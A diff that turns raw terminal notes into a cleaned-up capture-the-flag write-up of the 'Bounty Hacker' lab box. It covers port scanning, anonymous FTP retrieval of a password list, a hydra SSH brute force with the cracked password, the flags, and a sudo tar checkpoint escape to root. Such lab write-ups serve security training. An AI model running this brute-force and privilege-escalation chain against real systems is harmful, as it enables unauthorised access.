@@ -1,156 +1,53 @@
-nmap -sC -sV 10.10.176.174
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 13:14 -04
-Nmap scan report for 10.10.176.174
-Host is up (0.13s latency).
-Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.5
-| ftp-syst:
-|   STAT:
-| FTP server status:
-|      Connected to ::ffff:10.6.11.151
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 2
-|      vsFTPd 3.0.5 - secure, fast, stable
-|_End of status
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_Can't get directory listing: PASV failed: 550 Permission denied.
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   3072 63:2b:00:17:a0:88:5c:47:fa:91:c9:a0:48:34:65:cb (RSA)
-|   256 81:9f:48:de:84:1b:61:c1:c8:1c:85:f9:f7:68:00:85 (ECDSA)
-|_  256 d7:34:5a:45:8a:e3:45:6d:a8:88:5b:3d:11:62:fa:88 (ED25519)
-80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-title: Site doesn't have a title (text/html).
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+================================================================================
+CTF WRITEUP: BOUNTY HACKER
+Target IP: 10.10.176.174
+================================================================================
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 24.96 seconds
+1. ENUMERATION
+--------------------------------------------------------------------------------
+Command: nmap -sC -sV 10.10.176.174
+Results:
+- 21/tcp (FTP)  - vsFTDP 3.0.5 (Anonymous Login Allowed)
+- 22/tcp (SSH)  - OpenSSH 8.2p1
+- 80/tcp (HTTP) - Apache 2.4.41
 
+2. WEB DIRECTORY BRUTE FORCING
+--------------------------------------------------------------------------------
+Command: gobuster dir -u http://10.10.176.174/ -w /usr/share/wordlists/common.txt
+Found: /images, /javascript (Standard directories, no hidden vectors found).
 
-gobuster dir -u http://10.10.176.174/ -w /usr/SecLists/Discovery/Web-Content/common.txt
-===============================================================
-Gobuster v3.8
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.10.176.174/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/SecLists/Discovery/Web-Content/common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.8
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/.hta                 (Status: 403) [Size: 278]
-/.htaccess            (Status: 403) [Size: 278]
-/.htpasswd            (Status: 403) [Size: 278]
-/images               (Status: 301) [Size: 315] [--> http://10.10.176.174/images/]
-/index.html           (Status: 200) [Size: 969]
-/javascript           (Status: 301) [Size: 319] [--> http://10.10.176.174/javascript/]
-/server-status        (Status: 403) [Size: 278]
-Progress: 4750 / 4750 (100.00%)
-===============================================================
-Finished
-===============================================================
+3. FTP EXPLOITATION (FOOTHOLD)
+--------------------------------------------------------------------------------
+Logged in as "anonymous" / "ftp":
+Files found:
+- task.txt  : Mentioned "Protect Vicious" and was signed by "-lin".
+- locks.txt : A list of potential passwords.
+
+Identified Potential Username: lin
+
+4. INITIAL ACCESS (SSH)
+--------------------------------------------------------------------------------
+Brute-forcing "lin" using the custom wordlist (locks.txt) found on FTP:
+Command: hydra -l lin -P locks.txt ssh://10.10.176.174
+Credentials Found: lin : RedDr4gonSynd1cat3
+
+SSH Login: ssh lin@10.10.176.174
+User Flag: THM{CR1M3_SyNd1C4T3}
+
+5. PRIVILEGE ESCALATION
+--------------------------------------------------------------------------------
+Checking Sudo Privileges:
+Command: sudo -l
+Result: (root) /bin/tar
+
+GTFOBins Exploitation:
+Since tar can execute commands via checkpoint actions, I used the following:
+Command: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
 
-ftp 10.10.176.174
 
-login as ftp
-
-ls
--rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
--rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
-
-
-get locks.txt
-
-get task.txt
-
-exit
-
-cat locks.txt
-
-rEddrAGON
-ReDdr4g0nSynd!cat3
-Dr@gOn$yn9icat3
-R3DDr46ONSYndIC@Te
-ReddRA60N
-R3dDrag0nSynd1c4te
-dRa6oN5YNDiCATE
-ReDDR4g0n5ynDIc4te
-R3Dr4gOn2044
-RedDr4gonSynd1cat3
-R3dDRaG0Nsynd1c@T3
-Synd1c4teDr@g0n
-reddRAg0N
-REddRaG0N5yNdIc47e
-Dra6oN$yndIC@t3
-4L1mi6H71StHeB357
-rEDdragOn$ynd1c473
-DrAgoN5ynD1cATE
-ReDdrag0n$ynd1cate
-Dr@gOn$yND1C4Te
-RedDr@gonSyn9ic47e
-REd$yNdIc47e
-dr@goN5YNd1c@73
-rEDdrAGOnSyNDiCat3
-r3ddr@g0N
-ReDSynd1ca7e
-
-
-passwords?
-
-
-task.txt
-
-1.) Protect Vicious.
-2.) Plan for Red Eye pickup on the moon.
-
--lin
-
-username?
-
-hydra -l lin -P home/kupito/locks.txt ssh://10.10.176.174
-
-[22][ssh] host: 10.10.176.174   login: lin   password: RedDr4gonSynd1cat3
-
-
-ssh login
-
-lin@ip-10-10-176-174:~/Desktop$ ls
-user.txt
-lin@ip-10-10-176-174:~/Desktop$ cat user.txt
-THM{CR1M3_SyNd1C4T3}
-
-lin@ip-10-10-176-174:~/Desktop$ sudo -l
-Matching Defaults entries for lin on ip-10-10-176-174:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User lin may run the following commands on ip-10-10-176-174:
-    (root) /bin/tar
-
-gtfobins
-
-tar > sudo > sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-
-whoami root
-
-cd /root
-
-ls
-root.txt
-
-cat root.txt
-
-THM{80UN7Y_h4cK3r}
-
+6. FINAL FLAGS
+--------------------------------------------------------------------------------
+[USER] lin@Desktop: cat user.txt -> THM{CR1M3_SyNd1C4T3}
+[ROOT] root@root: cat root.txt -> THM{80UN7Y_h4cK3r}
+================================================================================
